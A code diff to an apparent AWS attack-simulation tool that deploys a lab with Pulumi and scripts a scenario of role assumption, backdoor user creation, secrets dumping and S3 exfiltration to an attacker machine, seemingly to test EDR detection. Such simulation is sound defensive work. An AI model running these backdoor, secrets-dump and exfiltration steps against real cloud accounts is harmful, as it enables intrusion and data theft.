@@ -62,9 +62,6 @@ class ScenarioExecution:
             "cd ./scenarios/scenario_8/infra/ && pulumi stack -s cobra-scenario-8 output --json --show-secrets > ../../../core/cobra-scenario-8-output.json"
         )
 
-        # TODO: Move config read and members init into seperate function
-        self.read_pulumi_config()
-
     def check_agent_connected(self):
         cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} "sudo /opt/traps/bin/cytool status"'
         output = run_subprocess(cmdline, return_output=True, check=False)
@@ -75,7 +72,7 @@ class ScenarioExecution:
         return edr_state == "Enabled"
 
     def wait_for_agent(self):
-        agent_connected = False
+        agent_connected = self.check_agent_connected()
         time_waited = 0
         while not agent_connected:
             if time_waited > MAX_CONNECTIVITY_WAIT_TIME:
@@ -207,8 +204,7 @@ class ScenarioExecution:
         s3_cmd = f"aws s3 sync s3://{self.exfil_bucket_name} /home/ubuntu/stolen_data/"
         self.attacker_run(s3_cmd, check=True)
 
-    def scenario_8_execute(self):
-
+    def scenario_8_execute(self, manual):
         # Init
         print("-" * 30)
         print(colored("Executing Scenraio 8 : AWS Persistence Privileges Escalation", color="red"))
@@ -221,6 +217,17 @@ class ScenarioExecution:
 
         self.init_infra()
         print(colored("Infra deployed!", color="red"))
+
+        if manual:
+            print(
+                colored("Using manual mode, use 'post-launch' in order to start the attack simulation", color="yellow"))
+
+        else:
+            self.post_execution()
+
+    def post_execution(self):
+        print(colored("Starting attack simulation...", "red"))
+        self.read_pulumi_config()
 
         print(colored("Waiting for attacker's machine to initialize...", color="red"))
         self.wait_for_attacker()
@@ -284,11 +291,18 @@ class ScenarioExecution:
         # Use higher privileges discovered role
         print(colored(f"Attempting to assume IAM monitor role...", "yellow"))
         self.attacker_assume_role(self.iam_monitor_role_arn)
-        self.attempt_backdoor()
+        if not self.attempt_backdoor():
+            print(colored("Could not create backdoor user with privileged role, aborting...", "red"))
+            exit(1)
+
         self.attempt_recon()
 
         # Secrets dump
         print(colored("Dumping secrets...", "red"))
+        if not self.discovered_secrets:
+            print(colored("Couldn't find secrets on recon attempts, aborting...", "red"))
+            exit(1)
+
         self.secrets_dump()
 
         # Exfiltration from S3
@@ -298,9 +312,6 @@ class ScenarioExecution:
 
         print(colored("Exfiltrating S3 data...", "red"))
         self.s3_exfiltration()
-
-    def post_execution(self):
-        pass
 
     def scenario_8_destroy(self):
         print(colored("Removing backdoor user...", "red"))
